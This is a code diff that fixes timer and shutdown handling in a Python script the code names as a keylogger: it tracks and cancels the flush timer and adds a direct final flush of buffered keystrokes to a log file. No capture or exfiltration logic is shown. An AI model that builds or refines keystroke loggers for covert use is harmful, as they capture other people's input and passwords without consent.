@@ -29,6 +29,7 @@ log_buffer = []
 buffer_lock = threading.Lock()
 flush_interval = 1  # Flush buffer to file every 1 second
 running = True
+_flush_timer = None  # Track the active timer so it can be cancelled
 
 def setup_log_file():
     """Initialize the log file with proper permissions."""
@@ -45,16 +46,18 @@ def setup_log_file():
 
 def flush_buffer():
     """Flush the log buffer to the file periodically."""
-    global log_buffer
+    global log_buffer, _flush_timer
     try:
         with buffer_lock:
             if log_buffer:
                 with open(log_file, "a", encoding="utf-8") as f:
                     f.writelines(log_buffer)
                 log_buffer = []
-        
+
         if running:
-            threading.Timer(flush_interval, flush_buffer).start()
+            _flush_timer = threading.Timer(flush_interval, flush_buffer)
+            _flush_timer.daemon = True
+            _flush_timer.start()
     except Exception as e:
         logging.error(f"Error in flush_buffer: {str(e)}")
         traceback.print_exc()
@@ -91,10 +94,18 @@ def on_press(key):
 
 def cleanup():
     """Cleanup resources before shutdown."""
-    global running
+    global running, _flush_timer
     try:
         running = False
-        flush_buffer()  # Final flush
+        # Cancel any pending timer before doing the final flush
+        if _flush_timer is not None:
+            _flush_timer.cancel()
+            _flush_timer = None
+        # Do a direct final flush (not via the timer-rescheduling flush_buffer)
+        with buffer_lock:
+            if log_buffer:
+                with open(log_file, "a", encoding="utf-8") as f:
+                    f.writelines(log_buffer)
         logging.info("Keylogger shutting down cleanly")
     except Exception as e:
         logging.error(f"Error during cleanup: {str(e)}")
@@ -115,7 +126,9 @@ def main():
         traceback.print_exc()
 
 if __name__ == "__main__":
+    _started = False
     try:
+        _started = True
         main()
     except KeyboardInterrupt:
         logging.info("Received keyboard interrupt")
@@ -123,4 +136,5 @@ if __name__ == "__main__":
         logging.error(f"Unhandled exception: {str(e)}")
         traceback.print_exc()
     finally:
-        cleanup()
+        if _started:
+            cleanup()
